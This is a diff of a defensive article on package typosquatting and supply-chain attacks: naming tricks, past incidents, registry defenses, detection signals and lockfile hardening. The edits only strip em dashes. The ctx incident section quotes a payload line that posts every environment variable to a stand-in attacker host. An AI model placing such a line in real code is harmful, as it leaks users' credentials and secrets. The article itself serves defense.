@@ -20,11 +20,11 @@
 
 ## What is it, actually
 
-Someone registers a package on PyPI, npm, RubyGems, etc. with a name that looks almost exactly like a popular library — one letter off, two letters swapped, a trailing character dropped. They wait. A developer types too fast, misses a key, hits enter. Package manager fetches the attacker's code without any complaint. Game over.
+Someone registers a package on PyPI, npm, RubyGems, etc. with a name that looks almost exactly like a popular library  one letter off, two letters swapped, a trailing character dropped. They wait. A developer types too fast, misses a key, hits enter. Package manager fetches the attacker's code without any complaint. Game over.
 
 That's the whole thing. No CVE, no vulnerability to exploit. Just a typo and a registry that trusts everything equally.
 
-The attacker's code runs at install time — before anyone reads it, before any linter sees it, before it hits version control. By the time something seems wrong, credentials are already gone.
+The attacker's code runs at install time before anyone reads it, before any linter sees it, before it hits version control. By the time something seems wrong, credentials are already gone.
 
 ---
 
@@ -55,7 +55,7 @@ The whole chain takes under ten seconds.
 
 ### Character swap
 
-Two letters get transposed. This is the most common one — your fingers just hit keys in the wrong order when you're typing fast.
+Two letters get transposed. This is the most common one your fingers just hit keys in the wrong order when you're typing fast.
 
 | Real package | Typosquat | What got swapped |
 |---|---|---|
@@ -71,7 +71,7 @@ Attackers actually study keyboard heatmaps and adjacency matrices to figure out 
 
 ### Character omission
 
-A letter gets dropped. Happens a lot with double consonants — your brain sees the word as correct even when one copy of the doubled letter is missing.
+A letter gets dropped. Happens a lot with double consonants your brain sees the word as correct even when one copy of the doubled letter is missing.
 
 | Real package | Typosquat | What's missing |
 |---|---|---|
@@ -87,7 +87,7 @@ The reason double-letter packages are so vulnerable is that humans mentally auto
 
 ### Visual substitution and homoglyphs
 
-Letters get swapped for things that look identical — or close enough that nobody notices. Numbers for letters, suffix reordering, or in the nastiest cases, Unicode lookalikes.
+Letters get swapped for things that look identical or close enough that nobody notices. Numbers for letters, suffix reordering, or in the nastiest cases, Unicode lookalikes.
 
 | Real package | Typosquat | The trick |
 |---|---|---|
@@ -96,7 +96,7 @@ Letters get swapped for things that look identical — or close enough that nobo
 | `crypto` | `crypt0` | `o` replaced with zero |
 | `webpack` | `webpaek` | `ck` reordered to `ek` |
 
-The Unicode variant is particularly nasty. A Cyrillic `а` and a Latin `a` are visually identical in most terminals and editors. A package named with Cyrillic characters looks correct in every tool that shows the name — but it's a completely different string to the registry.
+The Unicode variant is particularly nasty. A Cyrillic `а` and a Latin `a` are visually identical in most terminals and editors. A package named with Cyrillic characters looks correct in every tool that shows the name but it's a completely different string to the registry.
 
 ---
 
@@ -115,9 +115,9 @@ Alex Birsan demonstrated this against Microsoft, Apple, and 30+ other companies 
 
 ---
 
-## Real incidents — what actually happened
+## Real incidents what actually happened
 
-### `ua-parser-js` — npm, October 2021
+### `ua-parser-js` npm, October 2021
 
 Used by Facebook, Microsoft, Amazon. Over 8 million weekly downloads.
 
@@ -137,11 +137,11 @@ What would have stopped it: MFA on the maintainer account (the account takeover 
 
 ---
 
-### `event-stream` — npm, November 2018
+### `event-stream`npm, November 2018
 
 2 million weekly downloads. The target was one specific app: Copay, a Bitcoin wallet.
 
-The original maintainer, tired of maintaining it, handed the package off to someone who asked. That person added a malicious dependency called `flatmap-stream`. The payload only decrypted and ran if the consuming application's `package.json` contained `copay-dash` as a dependency — meaning it sat dormant in every other environment and completely evaded automated scanners for weeks.
+The original maintainer, tired of maintaining it, handed the package off to someone who asked. That person added a malicious dependency called `flatmap-stream`. The payload only decrypted and ran if the consuming application's `package.json` contained `copay-dash` as a dependency meaning it sat dormant in every other environment and completely evaded automated scanners for weeks.
 
 ```javascript
 // the payload only activated against the specific target
@@ -154,9 +154,9 @@ What would have stopped it: monitoring ownership transfers on packages you depen
 
 ---
 
-### `ctx` — PyPI, May 2022
+### `ctx` PyPI, May 2022
 
-This one was a researcher (Nikolai Tschacher) proving a point. He registered the abandoned `ctx` package — previously a real utility that real projects used — and modified it to exfiltrate everything in `os.environ` on every single `import`, not just at install time.
+This one was a researcher (Nikolai Tschacher) proving a point. He registered the abandoned `ctx` package previously a real utility that real projects used and modified it to exfiltrate everything in `os.environ` on every single `import`, not just at install time.
 
 ```python
 # what he injected into ctx/__init__.py
@@ -166,13 +166,13 @@ requests.post('https://attacker.io/collect', data=dict(os.environ))
 
 Every time any code imported the library, it sent `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `DATABASE_URL`, and everything else in the environment to his server. Production systems. Build runners. The lot.
 
-He returned everything and disclosed responsibly. But the point was made — abandoned packages sitting in your dependency tree are an open door.
+He returned everything and disclosed responsibly. But the point was made abandoned packages sitting in your dependency tree are an open door.
 
 ---
 
-### `colourama` / `coloаrama` — PyPI, 2018
+### `colourama` / `coloаrama` PyPI, 2018
 
-`colorama` is a terminal coloring utility used everywhere. The attacker registered `colourama` — banking on British-English spelling habits — and also a Unicode homoglyph variant where one letter was Cyrillic.
+`colorama` is a terminal coloring utility used everywhere. The attacker registered `colourama` banking on British-English spelling habits and also a Unicode homoglyph variant where one letter was Cyrillic.
 
 The payload was a clipboard hijacker. It sat in the background monitoring the clipboard, and whenever it detected a cryptocurrency wallet address, it silently swapped it with the attacker's address. The developer copies their own wallet address, pastes it into a transaction, and sends money straight to the attacker.
 
@@ -184,15 +184,15 @@ Locale-based spelling variations (colour/color, organise/organize) are a deliber
 
 Registries aren't sitting idle. Here's what's actually deployed:
 
-**Levenshtein distance blocking** — when you try to register a new package, the registry calculates the edit distance between your name and every package in the top 10,000 by downloads. If you're within 1–2 edits of a popular library, registration is rejected automatically. PyPI and npm both do this.
+**Levenshtein distance blocking** when you try to register a new package, the registry calculates the edit distance between your name and every package in the top 10,000 by downloads. If you're within 1–2 edits of a popular library, registration is rejected automatically. PyPI and npm both do this.
 
-**Name canonicalization** — PyPI normalizes underscores, hyphens, and capitalization so they all map to the same slot. `my-package`, `my_package`, and `MyPackage` are treated as the same name. Eliminates a whole category of case-variation attacks.
+**Name canonicalization** PyPI normalizes underscores, hyphens, and capitalization so they all map to the same slot. `my-package`, `my_package`, and `MyPackage` are treated as the same name. Eliminates a whole category of case-variation attacks.
 
-**Mandatory MFA** — npm enforced 2FA for maintainers of packages over 1M weekly downloads in 2022. PyPI followed in 2023. This directly addresses the account-takeover vector that hit `ua-parser-js`.
+**Mandatory MFA** npm enforced 2FA for maintainers of packages over 1M weekly downloads in 2022. PyPI followed in 2023. This directly addresses the account-takeover vector that hit `ua-parser-js`.
 
-**Behavioral sandboxing** — new packages get detonated in isolated environments. If a `postinstall` script makes a network connection, reads environment variables, or spawns a shell, the package gets quarantined automatically. PyPI uses Bandit-based scanning; npm partnered with Socket.dev.
+**Behavioral sandboxing** new packages get detonated in isolated environments. If a `postinstall` script makes a network connection, reads environment variables, or spawns a shell, the package gets quarantined automatically. PyPI uses Bandit-based scanning; npm partnered with Socket.dev.
 
-**Sigstore / trusted publishing** — cryptographically links a package release to a specific CI/CD pipeline run. Makes it verifiable that a package came from the repository it claims to. PyPI rolled this out in 2023.
+**Sigstore / trusted publishing** cryptographically links a package release to a specific CI/CD pipeline run. Makes it verifiable that a package came from the repository it claims to. PyPI rolled this out in 2023.
 
 These are real defenses, but they're not complete. A patient attacker who stays just outside the edit-distance threshold, uses a new account with low activity, and keeps the malicious payload subtle can still get through.
 
@@ -202,13 +202,13 @@ These are real defenses, but they're not complete. A patient attacker who stays 
 
 ### Audit tools in CI
 
-Make these part of your pipeline. Fail the build if anything comes up — don't just log it.
+Make these part of your pipeline. Fail the build if anything comes up don't just log it.
 
 ```bash
 # Node.js
 npm audit --audit-level=moderate
 
-# deeper supply chain analysis — checks install scripts, typosquats
+# deeper supply chain analysis checks install scripts, typosquats
 npx socket scan .
 
 # Python
@@ -250,10 +250,10 @@ What to flag:
 
 | Signal | When to act |
 |---|---|
-| Package published less than 72 hours before it was installed | Always — quarantine the host and review |
+| Package published less than 72 hours before it was installed | Always quarantine the host and review |
 | Package has fewer than 500 global downloads | Any time it appears in a production dependency |
 | Outbound DNS from a build server to an unknown host during install | Isolate immediately, take a forensic image |
-| `setup.py` or a `postinstall` script spawning a shell process | Immediate incident response — this is never legitimate |
+| `setup.py` or a `postinstall` script spawning a shell process | Immediate incident response this is never legitimate |
 | Environment variable access followed by an HTTP POST | Assume exfiltration has already occurred |
 
 ---
@@ -275,18 +275,18 @@ No legitimate package does this. If you see `python` spawning `curl` with an out
 
 ## How to stop it
 
-The core idea: stop relying on developers typing things correctly. Make the controls structural — baked into config — instead of behavioral.
+The core idea: stop relying on developers typing things correctly. Make the controls structural baked into config instead of behavioral.
 
 ### Lockfiles with hash verification
 
-This is the single most impactful control. Lockfiles don't just pin versions — they pin the SHA-256 hash of the actual package content. Even if an attacker manages to replace a package on the registry, the hash won't match and the install fails hard.
+This is the single most impactful control. Lockfiles don't just pin versions they pin the SHA-256 hash of the actual package content. Even if an attacker manages to replace a package on the registry, the hash won't match and the install fails hard.
 
 ```bash
-# npm — commit your package-lock.json, never gitignore it
+# npm commit your package-lock.json, never gitignore it
 npm install --save-exact package-name
 git add package-lock.json
 
-# Python — install with hash enforcement
+# Python install with hash enforcement
 pip install --require-hashes -r requirements.txt
 
 # verify a hash yourself before adding a new dependency
@@ -302,11 +302,11 @@ Never gitignore your lockfile. A repo without a committed lockfile is a repo tha
 ### Pin your versions explicitly
 
 ```
-# vulnerable — resolves whatever is latest at install time
+# vulnerable resolves whatever is latest at install time
 requests
 lodash
 
-# secure — exact version, paired with a lockfile for full protection
+# secure exact version, paired with a lockfile for full protection
 requests==2.31.0
 lodash@4.17.21
 ```
@@ -332,7 +332,7 @@ trusted-host = pypi.internal.yourcompany.com
 
 ---
 
-### Package allowlist (strictest option — worth it for production)
+### Package allowlist (strictest option worth it for production)
 
 If you're running in a regulated or high-security environment, go further: maintain an explicit list of approved packages at the proxy level. Anything not on the list doesn't install.
 
